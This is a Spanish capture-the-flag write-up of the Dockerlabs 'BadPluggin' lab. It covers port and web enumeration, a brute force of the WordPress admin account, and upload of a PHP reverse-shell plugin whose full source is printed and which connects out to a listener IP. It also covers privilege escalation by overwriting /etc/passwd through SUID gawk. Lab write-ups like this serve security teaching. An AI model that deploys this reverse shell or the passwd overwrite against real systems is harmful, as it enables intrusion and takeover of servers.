
# Writeup Template: Maquina `[ BadPluggin ]`

- Tags: #BadPluggin #gawk
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina BadPluggin](https://mega.nz/file/CM0BUKCa#q9BJhs25x1LoC_4ieLgimNFCic_zT-v2WjgcZeRmcPU)

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x badplugin.zip
sudo bash auto_deploy.sh badplugin.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
192.168.1.100
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 192.168.1.100 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 192.168.1.100
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 192.168.1.100 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 192.168.1.100 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p80 192.168.1.100 -oN targeted
```

**Servicios identificados:**
```bash
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
```
---

## Enumeracion de [Servicio Web Principal] `WordPress CMS`
direccion **URL** del servicio Tenemos **hostsDiscovery**:
```bash
http://escolares.dl/wordpress/
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://192.168.1.100/ # No reporta nada critico
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 192.168.1.100 
```

Reporte:
```bash
/info.php: Possible information file
/phpmyadmin/: phpMyAdmin
/wordpress/wp-login.php: Wordpress login page.
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://escolares.dl/wordpress/  -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
```bash
/wordpress/           (Status: 301) [Size: 0] [--> http://escolares.dl/wordpress/]
/phpmyadmin/          (Status: 200) [Size: 18605]
/about/               (Status: 200) [Size: 169447]
/contact/             (Status: 200) [Size: 140028]
/feed/                (Status: 200) [Size: 827]
/wp-content/          (Status: 200) [Size: 0]
/Contact/             (Status: 200) [Size: 140028]
/About/               (Status: 200) [Size: 169447]
/wp-includes/         (Status: 200) [Size: 59705]
/shows/               (Status: 200) [Size: 150579]
/lessons/             (Status: 200) [Size: 154253]
```

### Descubrimiento de Archivos
```bash
gobuster dir -u http://192.168.1.100/  -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,php.back,backup,txt,sh,html,js,java
```

- **Hallazgos**:
```bash
/index.html           (Status: 200) [Size: 1960]
/info.php             (Status: 200) [Size: 87190]
/wordpress            (Status: 301) [Size: 318] [--> http://192.168.1.100/wordpress/]
/javascript           (Status: 301) [Size: 319] [--> http://192.168.1.100/javascript/]
/phpmyadmin           (Status: 301) [Size: 319] [--> http://192.168.1.100/phpmyadmin/]
```

### Descubrimiento de Subdominios
```bash
wfuzz -c -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Host:FUZZ.escolares.dl" -u 192.168.1.100 --hl=10,76
```

- **Hallazgos**:
	No encontramos ningun subdominio

## Enumeracion `Wordpress`
```bash
wpscan --url http://escolares.dl/wordpress/ --enumerate u,vp,vt,tt,cb,dbe --plugins-detection aggressive
```
### Credenciales Encontradas
Tenemos un usuario administrador:
```bash
[i] User(s) Identified:

[+] admin
 | Found By: Wp Json Api (Aggressive Detection)
```

Ahora realizaremos fuerza bruta para el usuario admin:
```bash
wpscan --url http://escolares.dl/wordpress/ --passwords /usr/share/wordlists/rockyou.txt --usernames admin
```

Obtenemos credenciales validas:
```bash
!] Valid Combinations Found:
 | Username: admin, Password: rockyou
```

En estas rutas tenemos el panel de login:
```bash
/logo/                (Status: 301) [Size: 0] [--> http://escolares.dl/wordpress/wp-content/uploads/2024/12/logo.png]
/home/                (Status: 301) [Size: 0] [--> http://escolares.dl/wordpress/]
/rss/                 (Status: 301) [Size: 0] [--> http://escolares.dl/wordpress/feed/]
/about/               (Status: 200) [Size: 169447]
/login/               (Status: 302) [Size: 0] [--> http://escolares.dl/wordpress/wp-login.php]
/contact/             (Status: 200) [Size: 140028]
/i/                   (Status: 301) [Size: 0] [--> http://escolares.dl/wordpress/inicio/]
/0/                   (Status: 301) [Size: 0] [--> http://escolares.dl/wordpress/]
/feed/                (Status: 200) [Size: 827]
/atom/                (Status: 301) [Size: 0] [--> http://escolares.dl/wordpress/feed/atom/]
/s/                   (Status: 301) [Size: 0] [--> http://escolares.dl/wordpress/shows/]
/in/                  (Status: 301) [Size: 0] [--> http://escolares.dl/wordpress/inicio/]
/a/                   (Status: 301) [Size: 0] [--> http://escolares.dl/wordpress/about/]
/c/                   (Status: 301) [Size: 0] [--> http://escolares.dl/wordpress/contact/]
/wp-content/          (Status: 200) [Size: 0]
/admin/               (Status: 302) [Size: 0] [--> http://escolares.dl/wordpress/wp-admin/]
/Home/                (Status: 301) [Size: 0] [--> http://escolares.dl/wordpress/]
/show/                (Status: 301) [Size: 0] [--> http://escolares.dl/wordpress/shows/]
/h/                   (Status: 301) [Size: 0] [--> http://escolares.dl/wordpress/]
/l/                   (Status: 301) [Size: 0] [--> http://escolares.dl/wordpress/lessons/]
/rss2/                (Status: 301) [Size: 0] [--> http://escolares.dl/wordpress/feed/]
/Contact/             (Status: 200) [Size: 140028]
/About/               (Status: 200) [Size: 169447]
/wp-includes/         (Status: 200) [Size: 59705]
/C/                   (Status: 301) [Size: 0] [--> http://escolares.dl/wordpress/contact/]
/A/                   (Status: 301) [Size: 0] [--> http://escolares.dl/wordpress/about/]
/I/                   (Status: 301) [Size: 0] [--> http://escolares.dl/wordpress/inicio/]
/S/                   (Status: 301) [Size: 0] [--> http://escolares.dl/wordpress/shows/]
/shows/               (Status: 200) [Size: 150579]
/L/                   (Status: 301) [Size: 0] [--> http://escolares.dl/wordpress/lessons/]
/H/                   (Status: 301) [Size: 0] [--> http://escolares.dl/wordpress/]
/page2/               (Status: 301) [Size: 0] [--> http://escolares.dl/wordpress/page/2/]
/sh/                  (Status: 301) [Size: 0] [--> http://escolares.dl/wordpress/shows/]
/rdf/                 (Status: 301) [Size: 0] [--> http://escolares.dl/wordpress/feed/rdf/]
/page1/               (Status: 301) [Size: 0] [--> http://escolares.dl/wordpress/]
/Logo/                (Status: 301) [Size: 0] [--> http://escolares.dl/wordpress/wp-content/uploads/2024/12/logo.png]
/co/                  (Status: 301) [Size: 0] [--> http://escolares.dl/wordpress/contact/]
/page3/               (Status: 301) [Size: 0] [--> http://escolares.dl/wordpress/page/3/]
/page4/               (Status: 301) [Size: 0] [--> http://escolares.dl/wordpress/page/4/]
/page5/               (Status: 301) [Size: 0] [--> http://escolares.dl/wordpress/page/5/]
/lessons/             (Status: 200) [Size: 154253]
/page6/               (Status: 301) [Size: 0] [--> http://escolares.dl/wordpress/page/6/]
/dashboard/           (Status: 302) [Size: 0] [--> http://escolares.dl/wordpress/wp-admin/]

```

Ahora apuntamos a esta ruta para intentar loguearnos con esas credenciales:
```bash
http://escolares.dl/wordpress/wp-login.php
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Hemos logrado la instrucion al panel administrativo del **wordpress**, Ahora tenemos que ver si podemos explotar el **tema** **astra** que posiblemente es vulnerable:
```bash
[+] WordPress theme in use: astra
 | Location: http://escolares.dl/wordpress/wp-content/themes/astra/
 | Last Updated: 2025-06-17T00:00:00.000Z
 | Readme: http://escolares.dl/wordpress/wp-content/themes/astra/readme.txt
 | [!] The version is out of date, the latest version is 4.11.3
 | Style URL: http://escolares.dl/wordpress/wp-content/themes/astra/style.css
 | Style Name: Astra
 | Style URI: https://wpastra.com/
 | Description: Astra is fast, fully customizable & beautiful WordPress theme suitable for blog, personal portfolio,...
 | Author: Brainstorm Force
 | Author URI: https://wpastra.com/about/?utm_source=theme_preview&utm_medium=author_link&utm_campaign=astra_theme
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 4.8.8 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://escolares.dl/wordpress/wp-content/themes/astra/style.css, Match: 'Version: 4.8.8'
```

Usaremos este script que nos permite subir un archivo para que nos otorgue una revershell: [Revershell PentesMonkey](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php)
```php
<?php
/*
Plugin Name: Reverse Shell Plugin
Plugin URI: https://github.com/SkyW4r33x
Description: Plugin RevShell
Version: 1.0
Author: SkyW4r33x
Author URI: https://github.com/SkyW4r33x
License: GPL2
*/
set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.1.1';  // CHANGE THIS
$port = 443;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 

```

Ahora comprimimos nuestro archivo: 
```bash
zip -r virus.zip shellPluggin.php
  adding: shellPluggin.php (deflated 59%)
```
### Ejecucion del Ataque
En esta ruta subiremos el **pluggin** que hemos comprimido:
```bash
http://escolares.dl/wordpress/wp-admin/plugin-install.php
```
### Intrusion
Nos permita cargar un **pluggin** asi que subimos el nuestro **virus.zip**: una ves subido primero nos pones en escucha
```bash
nc -nlvp 433
```

Ahora solo activamos el **pluggin** y tendremos una shell como el usuario **www-data**

---
## Escalada de Privilegios
### Enumeracion del Sistema
En esta ruta tenemos la configuracion de la base de datos:
```bash
# Comandos clave ejecutados
/var/www/html/wordpress/wp-config.php
```

**Hallazgos Clave:**
Revisando tenemos credencilaes de acceso:
```bash
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wordpressuser' );

/** Database password */
define( 'DB_PASSWORD', 'contrapoderosa123' );
```

### Explotacion de Privilegios

###### Usuario `[ www-data ]`:
Ahora nos aprovecharnos de eso para ver la base de datos
```bash
mysql -u wordpressuser -p # ( contrapoderosa123 )
```

No encontramos gran cosa en la base de datos, Ahora si listamos por permisos **SUID**
```bash
find / -perm -4000 -ls 2>/dev/null
```

Tenemos un binario:
```bash
7451646    728 -rwsr-xr-x   1 root     root         739840 Mar 30  2024 /usr/bin/gawk
```

Para explotar este binario, Nos creamos una capia del archivo **/etc/passwd** en el directorio **tmp**, Quitandole la **x** en nuestro archivo falso para que cuando logremos inyectar el contenido nos permita loguearnos como **root** sin proporcionar contrasena:
```bash
/usr/bin/gawk '{print > "/etc/passwd"}' passwd
```

Ahora solo ejecutamos este comando para elevar nuestro privilegio:
```bash
# Comando para escalar al usuario: ( root )
[comando_escalada]
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@89c32be65b05:~# whoami
root
```

---
